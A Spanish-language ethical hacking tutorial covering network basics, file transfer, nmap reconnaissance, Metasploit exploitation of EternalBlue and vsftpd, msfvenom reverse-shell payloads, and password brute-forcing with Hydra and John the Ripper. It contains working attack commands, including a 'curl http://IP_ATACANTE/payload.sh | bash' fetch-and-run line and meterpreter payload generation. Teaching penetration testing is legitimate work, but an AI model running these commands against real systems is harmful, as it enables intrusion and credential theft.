Conceptos Fundamentales de Redes

¿Qué es un host en una red?

Un host es cualquier dispositivo que tiene una dirección IP y está conectado a una red. Puede ser un ordenador, servidor, impresora, teléfono móvil, o cualquier dispositivo que pueda comunicarse a través de la red.

Asignación de IPs y DHCP

El router es el dispositivo encargado de asignar direcciones IP a los diferentes dispositivos de la red local mediante el protocolo DHCP (Dynamic Host Configuration Protocol).

Las IPs asignadas son generalmente direcciones IP privadas (como 192.168.x.x) y pueden cambiar si se reinicia el router, aunque algunos dispositivos pueden tener IPs fijas configuradas manualmente.

Máscara de Red y Porciones

La máscara de red (como 255.255.255.0) indica qué parte de la dirección IP corresponde a la red y qué parte corresponde al host.

Por ejemplo, en la IP 192.168.1.21 con máscara 255.255.255.0:

  • Porción de red: 192.168.1
  • Porción de host: 21

El broadcast es una dirección especial utilizada para enviar mensajes a todos los dispositivos en una red (por ejemplo, 192.168.1.255).

Diferencias entre NAT, Adaptador Puente y Red Interna

Tipo de Red Características Conectividad a Internet Seguridad
Adaptador Puente Las máquinas virtuales se comportan como cualquier otro equipo en la red, tienen visibilidad y obtienen una dirección IP similar a los demás dispositivos Sí Baja - visible en la red
NAT (Network Address Translation) Las máquinas virtuales comparten la IP del anfitrión. Cuando se hace una petición, el servidor ve la IP del anfitrión, no la de la máquina virtual Sí Alta - capa adicional de seguridad
Red Interna/NAT Interfaz de red que funciona solo en VirtualBox, aislada del resto de la red No Muy alta - completamente aislada

Detalles importantes:

  • Adaptador Puente: Las máquinas virtuales se comportan como cualquier otro equipo en la red, tienen visibilidad y obtienen una dirección IP similar a los demás dispositivos
  • NAT: Cuando hacemos una petición a un servidor desde una máquina virtual con NAT activado, el servidor ve la IP de nuestra máquina anfitriona y no la de la máquina virtual. Esto proporciona una capa adicional de seguridad
  • Red Interna/NAT: Se puede crear una interfaz de red que funcione solo en VirtualBox, sin acceso a Internet, ideal para entornos completamente aislados

Módulo 2: Transferencia de Archivos y Conceptos Básicos de Hacking

Intermedio

Resumen del Módulo

Este módulo explora diferentes métodos para transferir archivos entre máquinas en una red local, una habilidad esencial para cualquier pentester. También cubre los conceptos básicos de hacking, incluyendo el uso de herramientas como netcat para establecer conexiones remotas. Aprenderás sobre los protocolos más comunes, sus ventajas, desventajas y casos de uso práctico en entornos de pruebas de penetración.

Objetivos de aprendizaje: Al finalizar este módulo, podrás:

  • Implementar diferentes métodos de transferencia de archivos
  • Evaluar la seguridad de cada método
  • Seleccionar el método adecuado según el contexto
  • Aplicar estos métodos en escenarios de pentesting
  • Entender y aplicar conceptos básicos de hacking ético

Métodos para Transferir Archivos

Método 1: Servidor HTTP con Python

El método más sencillo para compartir archivos en una red local es utilizando el módulo http.server de Python.

# En la máquina que envía (atacante):
python3 -m http.server 80

# En la máquina que recibe (víctima):
# Con wget
wget http://IP_ATACANTE/archivo.txt

# Con curl
curl http://IP_ATACANTE/archivo.txt -o archivo_descargado.txt

# Para Windows
certutil -urlcache -f http://IP_ATACANTE/archivo.txt archivo_descargado.txt

Ventajas: Simple, no requiere instalación de software adicional, accesible desde cualquier navegador.

Desventajas: Requiere Python 3 instalado, tráfico no cifrado (HTTP), necesidad de conocer la IP del atacante.

Método 2: SSH (Secure Shell)

SCP (Secure Copy) es un método seguro y cifrado para transferir archivos entre máquinas que tienen SSH habilitado.

# Desde la máquina atacante a la víctima:
scp /home/kali/Escritorio/cosa.txt Juan@192.168.1.24:/home/Juan/Desktop/

# Desde la máquina víctima a la atacante:
scp Juan@192.168.1.24:/home/Juan/Desktop/cosa.txt /home/kali/Escritorio/

Ventajas: Seguro y cifrado, autenticación robusta, ampliamente disponible.

Desventajas: Requiere SSH habilitado en ambas máquinas, puede estar bloqueado por firewalls.

Método 3: FTP (File Transfer Protocol)

FTP permite transferir archivos entre máquinas, aunque con importantes consideraciones de seguridad.

# En la máquina atacante (Kali):
python3 -m pyftpdlib -p 21 -w -u "kali" -P "kali"

-m pyftpdlib → Ejecuta el módulo pyftpdlib (servidor FTP en Python)
-p 21 → Puerto 21 (FTP)
-w → Permite escritura (uploads/put)
-u "kali" → Define usuario
-P "kali" → Define contraseña
# En la máquina víctima (Deepin):
ftp 192.168.1.26
# Usuario: kali
# Contraseña: kali

# Comandos dentro de FTP:
ftp> ls → Listar archivos
ftp> get archivo → Descargar archivo
ftp> put archivo → Subir archivo
ftp> bye → Salir

Aspectos de seguridad CRÍTICOS:

  • Traffico NO cifrado: FTP envía todo (usuarios, contraseñas, archivos) en texto claro. Cualquier sniffer en la red puede capturar los datos.
  • Detección fácil: Los servidores FTP son ruidosos y fácilmente detectados por herramientas de monitoreo.
  • Uso solo en redes internas/controladas: Nunca uses FTP en internet abierto.

Método 4: Netcat

Netcat es una herramienta versátil que puede usarse para transferir archivos entre máquinas.

# En la máquina atacante (recibiendo):
nc -n -l -v -p 4444 > archivo_recibido.txt

# En la máquina víctima (enviando):
nc -N 192.168.1.26 4444 < archivo_a_enviar.txt

Detalles importantes:

  • Orden CRUCIAL: Primero inicia netcat en Kali (receptor) y luego en Deepin (emisor).
  • Sin cifrado: Todo se envía en texto claro (igual que FTP).
  • Transferencia única: La conexión se cierra después de enviar el archivo.
  • Versiónes de netcat: La opción -N no está en todas las versiones. Si falla, usa: nc 192.168.1.26 4444 < archivo_a_enviar.txt

Conceptos Básicos de Hacking

Lección 1: Uso de Netcat para entablar Reverse Shell

Netcat es una potente herramienta que permite establecer conexiones remotas. Si podemos ejecutar comandos en la máquina víctima, podemos usar netcat para obtener una reverse shell.

# En la máquina atacante (Kali):
nc -n -l -v -p 443

-n → No realiza búsquedas DNS, hace que la conexión sea más rápida
-l → Listen, activa el modo escucha, esperando una conexión entrante
-v → Verbose, muestra información más detallada sobre lo que está haciendo
-p → Especifica el puerto que estará abierto para la conexión entrante

En la página https://www.revshells.com/, ingresando la IP y un puerto, obtenemos un comando que si lo ejecutamos desde la máquina víctima, recibiremos una conexión.

Lección 2: Cómo Compartir Archivos Con Servidor Http

Compartir archivos es sencillo con Python:

python3 -m http.server 80

Con este comando desde la máquina atacante, se pone a la escucha. Después de esto, si en el navegador de la otra máquina pongo la IP de la máquina atacante, accedo y puedo descargar archivos.

Si tenemos ejecución remota de comandos desde la máquina víctima, podemos ejecutar un curl o wget:

# En la máquina víctima:
curl http://IP_ATACANTE/payload.sh | bash
wget -O- http://IP_ATACANTE/payload.sh | bash

Lección 3: Compartir Archivos por la Red en Máquinas Windows

En máquinas Windows no podemos usar curl ni wget, así que necesitamos otro método para transferir archivos.

# En la máquina Windows:
certutil -urlcache -f http://IP_KALI/archivo.txt archivo.txt

La herramienta certutil es una herramienta ya instalada en Windows que podemos usar para transferir archivos.

Lección 4: Reconocimiento de la red con ARP-SCAN y NETDISCOVER

Para encontrar equipos conectados en nuestra red privada, tenemos varias herramientas:

# arp-scan
arp-scan -I eth0 --localnet

# netdiscover
netdiscover -i eth0 -r 192.168.1.0/24

# nmap (escaneo de hosts)
nmap -sn 192.168.1.0/24

Un TTL superior a 100 en un ping indica que probablemente es una máquina Windows (TTL típico: 128), mientras que un TTL ≤ 64 indica probablemente Linux/Unix.

Lección 5: Escaneos Básicos con Nmap

Nmap es una herramienta imprescindible para escanear puertos y obtener información de los hosts.

nmap -p- --open -sS -sC -sV --min-rate 2000 -n -Pn -vvv -oN resultado.txt 192.168.1.25
Parámetro Descripción
-p- Escanea todos los puertos posibles
--open Muestra solo puertos abiertos
-sS Escaneo SYN, más rápido y sigiloso
-sC Ejecuta scripts por defecto para obtener más información
-sV Detecta versiones de servicios
-n No realiza resolución DNS, más rápido
-Pn No hace ping, asume que el host está activo
-oN Guarda la salida en formato normal en un archivo

Lección 6: Detectar Vulnerabilidades Con Nmap

Podemos usar nmap para detectar vulnerabilidades conocidas:

nmap --script "vuln" -p 445 192.168.1.25

Un CVE (Common Vulnerabilities and Exposures) es un identificador único para vulnerabilidades públicas. Por ejemplo, CVE-2017-0143 se refiere a la vulnerabilidad EternalBlue en Windows.

Lección 7: Escaneo de Puertos bajo el Protocolo UDP

Además de TCP, también podemos escanear puertos UDP:

nmap -sU --top-ports 200 192.168.1.120

La principal diferencia entre TCP y UDP es que TCP es orientado a conexión y más fiable, mientras que UDP es sin conexión y más rápido.

Módulo 3: Explotación de Vulnerabilidades y Fuerza Bruta

Avanzado

Resumen del Módulo

Este módulo se centra en la explotación de vulnerabilidades identificadas durante las fases de escaneo y reconocimiento, así como en los ataques de fuerza bruta para obtener acceso a sistemas. Aprenderás a utilizar Metasploit Framework, generar payloads personalizados con Msfvenom, y realizar ataques de fuerza bruta con herramientas como Hydra y John the Ripper. Estas técnicas son fundamentales para demostrar el impacto real de las vulnerabilidades encontradas.

Objetivos de aprendizaje: Al finalizar este módulo, podrás:

  • Utilizar Metasploit Framework para explotar vulnerabilidades
  • Generar payloads personalizados con Msfvenom
  • Realizar ataques de fuerza bruta con Hydra
  • Crackear contraseñas locales con John the Ripper
  • Aplicar estas técnicas en escenarios de pentesting realistas

Explotación de Vulnerabilidades

Lección 1: Uso Básico de Metasploit – Explotación EternalBlue en Windows

Metasploit Framework es la herramienta más poderosa para la explotación de vulnerabilidades.

# 1. Buscar el exploit por CVE
search CVE-2017-0143

# 2. Seleccionar el exploit
use 0 # o el número del exploit

# 3. Ver opciones requeridas
show options

# 4. Configurar el host objetivo
set RHOSTS 192.168.1.25

# 5. Ejecutar el exploit
exploit # o run

Componentes clave de Metasploit:

  • Exploit: Código que aprovecha una vulnerabilidad específica
  • Payload: Código que se ejecuta después de la explotación (lo más importante)
  • Reverse Shell: Conexión desde la víctima al atacante
  • Multi/Handler: Módulo que espera conexiones entrantes (alternativa a netcat)

Lección 2: Uso Básico de Metasploit – Explotación vsftpd en Linux

Algunas vulnerabilidades no tienen CVE asociado, por lo que se debe buscar por servicio y versión.

# Buscar por nombre de servicio y versión
search vsftpd 2.3.4

# Seleccionar y configurar el exploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.30
run

Servicios comunes y sus puertos:

  • Puerto 21: Servicio vsFTPd
  • Puerto 22: Servicio SSH
  • Puerto 80: Servicio HTTP

Lección 3: Msfvenom – Generar Nuestros Propios Payloads

Msfvenom es una herramienta para generar payloads personalizados que pueden ser utilizados en ataques de explotación.

msfvenom -p windows/x64/meterpreter/reverse_tcp LPORT=443 -f exe -o archivo_malicioso.exe
Parámetro Descripción Ejemplo
-p Payload (código malicioso) windows/x64/meterpreter/reverse_tcp
LPORT Puerto de escucha en el atacante 443 (HTTPS)
-f Formato de salida exe, php, asp, etc.
-o Nombre del archivo de salida archivo_malicioso.exe

Proceso completo de explotación con Msfvenom:

  1. Generar el payload con Msfvenom
  2. Compartir el payload con la víctima (HTTP, FTP, etc.)
  3. Poner al atacante a la escucha con multi/handler
  4. Esperar a que la víctima ejecute el payload
  5. Obtener acceso remoto
# 1. Generar payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.26 LPORT=443 -f exe -o payload.exe

# 2. Poner a la escucha el multi/handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.26
set LPORT 443
run

Ataques de Fuerza Bruta

Lección 4: Uso de Hydra – Ataques de Fuerza Bruta a Contraseñas (SSH y FTP)

Hydra es una herramienta rápida y flexible para ataques de fuerza bruta contra múltiples protocolos.

# Ataque a SSH con usuario conocido
hydra -l juan -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.23

# Ataque a FTP con usuario conocido
hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.23
Parámetro Uso Nota
-l Usuario específico (lowercase L) Usar cuando conoces el usuario
-L Archivo con lista de usuarios (uppercase L) Para ataques a usuarios
-p Contraseña específica (lowercase P) Para ataques con contraseña conocida
-P Archivo con lista de contraseñas (uppercase P) Para ataques a contraseñas

Lección 5: Uso de Hydra – Ataques de Fuerza Bruta a Usuarios (SSH y FTP)

Para ataques donde conocemos la contraseña pero no el usuario:

# Ataque a usuarios con contraseña conocida
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -p alexis ssh://192.168.1.23

Lección 6: Uso de Hydra – Ataques de Fuerza Bruta a Paneles de Login Web

Para ataques a formularios web, es necesario capturar la petición con Burp Suite o similar.

hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.24 http-post-form "/my_weblog/admin.php:username=admin&password=^PASS^:Incorrect username or password."

Elementos clave en ataques web:

  • http-post-form: Indica que es un formulario POST
  • ^USER^ y ^PASS^: Marcadores que Hydra reemplaza con valores del diccionario
  • Mensaje de error: Lo que aparece cuando el login falla (para detectar intentos fallidos)

Lección 7: Ataques de Fuerza Bruta con Metasploit

Metasploit también puede realizar ataques de fuerza bruta.

# Buscar módulo de fuerza bruta para SSH
search ssh_login

# Usar el módulo
use auxiliary/scanner/ssh/ssh_login

# Configurar opciones
set USERNAME juan
set RHOSTS 192.168.1.23
set PASS_FILE /usr/share/wordlists/rockyou.txt

# Ejecutar el ataque
run

Lección 8: Ataques de Fuerza Bruta contra Bases de Datos

Los servicios de bases de datos como MySQL son objetivos comunes para ataques de fuerza bruta.

# Ataque a MySQL
hydra -l capybara -P /usr/share/wordlists/rockyou.txt mysql://192.168.1.35:3306

# Conexión a MySQL después del ataque
mysql -u capybara -p -h 192.168.1.35

Lección 9: Ataques de Fuerza Bruta en Local con John The Ripper

John the Ripper es una herramienta para crackear contraseñas locales de archivos protegidos.

Crackeo de archivos comprimidos:

# Extraer el hash de un archivo ZIP
zip2john archivo.zip > hash.txt

# Crackear el hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Crackeo de bases de datos KeePass:

# Extraer el hash de una base de datos KeePass
keepass2john Database.kdbx > hash.txt

# Crackear el hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Crackeo de hashes directos:

Cuando se encuentra un hash (MD5, SHA1, etc.), se puede intentar crackearlo.

# Identificar el tipo de hash
hash-identifier

# Crackear con tipo especificado
john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Glosario de Hacking Ético

Conceptos Básicos de Redes

Host: Cualquier dispositivo que tiene una dirección IP y está conectado a una red, como un ordenador, servidor o impresora.
DHCP (Dynamic Host Configuration Protocol): Protocolo que asigna automáticamente direcciones IP a los dispositivos en una red.
IP (Internet Protocol): Sistema de direccionamiento que identifica de forma única a los dispositivos en una red.
NAT (Network Address Translation): Tecnología que permite que múltiples dispositivos compartan una única dirección IP pública.
Adaptador Puente: Modo de red virtual que permite que la máquina virtual se comporte como cualquier otro dispositivo en la red física.
TCP (Transmission Control Protocol): Protocolo de transporte orientado a conexión que garantiza la entrega de datos.
UDP (User Datagram Protocol): Protocolo de transporte sin conexión que envía datos sin garantizar su entrega.
Ping: Herramienta de red que verifica la conectividad entre dos dispositivos enviando paquetes de eco.
TTL (Time To Live): Valor que limita la vida útil de un paquete de red, también útil para identificar sistemas operativos.

Herramientas de Pentesting

Nmap (Network Mapper): Herramienta de escaneo de redes utilizada para descubrir hosts y servicios en una red.
arp-scan: Herramienta que utiliza el protocolo ARP para descubrir hosts en una red local.
netdiscover: Herramienta activa y pasiva para descubrir hosts en una red, similar a arp-scan.
CVE (Common Vulnerabilities and Exposures): Identificador único para vulnerabilidades públicas en software.
Exploit: Código o técnica que aprovecha una vulnerabilidad para obtener acceso no autorizado.
Payload: Código malicioso que se ejecuta después de una explotación exitosa.
Reverse Shell: Conexión desde una máquina comprometida hacia el atacante, permitiendo el control remoto.
Metasploit Framework: Plataforma de desarrollo y ejecución de exploits para pruebas de penetración.
Msfvenom: Herramienta de Metasploit para generar payloads personalizados.

Ataques y Técnicas

Hydra: Herramienta de fuerza bruta para atacar servicios de autenticación.
John the Ripper: Herramienta para crackear contraseñas locales y hashes.
Hash: Función criptográfica que convierte datos en una cadena única de longitud fija.
Fuerza Bruta: Técnica de ataque que prueba sistemáticamente todas las combinaciones posibles de contraseñas.
Diccionario: Lista de palabras o contraseñas comunes utilizada en ataques de fuerza bruta.
Netcat: Herramienta de red versátil que puede leer y escribir datos en conexiones de red.
SCP (Secure Copy): Protocolo para transferir archivos entre máquinas de forma segura usando SSH.
FTP (File Transfer Protocol): Protocolo estándar para transferir archivos entre máquinas, aunque inseguro.
certutil: Herramienta de Windows que puede usarse para transferir archivos desde la línea de comandos.
